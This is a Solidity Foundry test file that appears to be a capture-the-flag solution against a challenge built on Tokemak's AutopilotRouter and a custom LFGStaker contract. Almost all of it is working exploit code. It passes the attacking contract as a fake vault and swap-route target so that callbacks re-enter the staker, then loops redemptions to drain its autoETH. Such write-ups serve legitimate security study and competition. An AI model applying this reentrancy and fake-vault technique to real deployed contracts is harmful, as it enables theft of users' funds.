// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import "src/tokemak/SystemRegistry.sol";
import "src/tokemak/vault/AutopilotRouter.sol";
import "src/tokemak/swapper/SwapRouterV2.sol";
import "src/tokemak/security/SystemSecurityL1.sol";
import "src/tokemak/vault/AutopoolETH.sol";
import "src/tokemak/interfaces/utils/IWETH9.sol";

import "src/LFGStaker.sol";
import "src/Challenge.sol";

contract Solve is Test {
    
    Challenge challenge;
    LFGStaker staker;
    IWETH9 weth;
    AutopoolETH autoETH;
    address constant TOKEMAK_TREASURY = 0x8b4334d4812C530574Bd4F2763FcD22dE94A969B;
    address constant SYSTEM_REGISTRY = 0x2218F90A98b0C070676f249EF44834686dAa4285;

    function setUp() public {
        address system = address(0x420);
        address player = address(this);
        vm.startBroadcast(system);

        SystemRegistry systemRegistry = SystemRegistry(SYSTEM_REGISTRY);
        vm.etch(address(systemRegistry.autoPoolRouter()), address(new AutopilotRouter(systemRegistry)).code);
        vm.etch(address(systemRegistry.swapRouter()), address(new SwapRouterV2(systemRegistry)).code);
        vm.etch(address(systemRegistry.systemSecurity()), address(new SystemSecurityL1(systemRegistry)).code);

        challenge = new Challenge(player);
        autoETH = AutopoolETH(challenge.AUTOPOOL_ETH());
        staker = LFGStaker(challenge.LFG_STAKER());

        vm.stopBroadcast();

        // Fund System with 100 autoETH from Tokemak treasury
        vm.startBroadcast(TOKEMAK_TREASURY);
        autoETH.transfer(system, 100 ether);
        autoETH.transfer(address(this), 100 ether);
        vm.stopBroadcast();

        vm.startBroadcast(system);

        autoETH.approve(address(staker), type(uint).max);
        staker.deposit(100 ether);

        vm.stopBroadcast();
    }

    function test_case() public {
        SystemRegistry system = SystemRegistry(0x2218F90A98b0C070676f249EF44834686dAa4285);
        weth = system.weth();
        IAutopilotRouter router = system.autoPoolRouter();
        autoETH = AutopoolETH(challenge.AUTOPOOL_ETH());
        staker = LFGStaker(challenge.LFG_STAKER());

        ISwapRouterV2.UserSwapData[] memory routes = new ISwapRouterV2.UserSwapData[](2);
        routes[0].fromToken = 0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6;
        routes[0].toToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        routes[0].target = address(this);
        routes[0].data = abi.encodeWithSignature("swapCallback()");
        
        autoETH.approve(address(staker), type(uint).max);
        staker.deposit(1 ether);

        weth.approve(address(router), type(uint).max);
        autoETH.approve(address(router), type(uint).max);
        router.redeemWithRoutes(autoETH, address(this), 99 ether, 0, routes);
    }

    function test_solve() public {
        console.log(challenge.isSolved());

        SystemRegistry system = SystemRegistry(0x2218F90A98b0C070676f249EF44834686dAa4285);
        weth = system.weth();
        IAutopilotRouter router = system.autoPoolRouter();
        autoETH = AutopoolETH(challenge.AUTOPOOL_ETH());
        staker = LFGStaker(challenge.LFG_STAKER());

        weth.transfer(address(0xdeadbeef), weth.balanceOf(address(this)));

        weth.deposit{value: 0.99 ether}();
        router.depositMax(autoETH, address(this), 0);

        ISwapRouterV2.UserSwapData[] memory routes = new ISwapRouterV2.UserSwapData[](2);
        routes[0].fromToken = 0x04C154b66CB340F3Ae24111CC767e0184Ed00Cc6;
        routes[0].toToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        routes[0].target = address(this);
        routes[0].data = abi.encodeWithSignature("swapCallback()");

        autoETH.approve(address(staker), type(uint).max);

        console.log("%e", autoETH.balanceOf(address(this)));

        for (uint i; i < 20; i++) {
            router.redeemWithRoutes(AutopoolETH(address(this)), address(this), 0, 0, routes);
            staker.redeem(staker.balanceOf(address(this)));
            console.log("%e", autoETH.balanceOf(address(this)));
        }

        console.log("%e", autoETH.balanceOf(address(staker)));

        console.log(challenge.isSolved());
    }

    uint c = 0;

    function swapCallback() external {
        console.log("swapCallback");
        if (c == 0) {
            staker.redeem(staker.balanceOf(address(this)));
            c = 1;
        }
    }

    function redeem(uint, address, address) external returns (uint) {
        uint wb = weth.balanceOf(address(autoETH));
        uint b = autoETH.balanceOf(address(this));
        uint sb = autoETH.balanceOf(address(staker));
        if (sb >= wb + 1 ether) {
            staker.deposit(b);
        } else if (b >= wb - sb + 1 ether) {
            staker.deposit(wb - sb);
            staker.deposit(b - (wb - sb));
        } else {
            staker.deposit(b);
        }
        return 0;
    }
}